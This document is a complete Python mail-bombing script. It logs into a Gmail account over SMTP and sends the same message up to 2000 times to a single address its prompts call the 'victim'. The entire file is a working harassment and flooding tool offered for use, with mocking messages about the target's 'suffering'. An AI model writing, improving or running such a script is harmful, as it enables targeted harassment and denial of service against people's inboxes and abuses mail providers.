#!/usr/bin/env python

import smtplib
from email.mime.multipart import MIMEMultipart

__author__ = "Bolinooo"


class Message(object):

    def __init__(self, sender, recipient, subject, body):
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = recipient
        msg['Subject'] = subject
        self.sender = sender
        self.recipient = recipient
        self.subject = subject
        self.body = body
        self.msg = msg


def main():

    number = get_amount()

    sender = str(input("Enter sender: "))
    pwd = str(input("Enter pass: "))
    recipient = str(input("Enter victim: "))
    subject = str(input("Enter subject: "))
    body = str(input("Enter body: "))

    sent_mail(number, sender, pwd, recipient, subject, body)


def get_amount():
    """
    Get amount of mails to sent
    :return: Integer
    """
    while True:
        num = int(input("How many mails do you'd like to sent to your victim?: "))
        if 0 < num < 2001:
            return num
        print("You've entered wrong amount of entries.")


def connect_smtp():

    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    return server


def sent_mail(amount, sender, pwd, recipient, subject, body=""):
    """
    Function to sent a single mail
    :param body: String type of body
    :param pwd: String type of password sender
    :param subject: String type of subject
    :param recipient: String type of recipient address
    :param sender: String type of sender address
    :param amount: Integer type of amount of mails to sent
    :return:
    """

    count = 0
    while count < amount:

        mail = Message(sender, recipient, subject, body)
        server = connect_smtp()
        server.login(sender, pwd)
        text = mail.msg.as_string()
        try:
            server.sendmail(mail.sender, mail.recipient, text)
        except KeyboardInterrupt:
            print("You're kind enough to stop suffering.")
            break
        count += 1

if __name__ == "__main__":
    main()
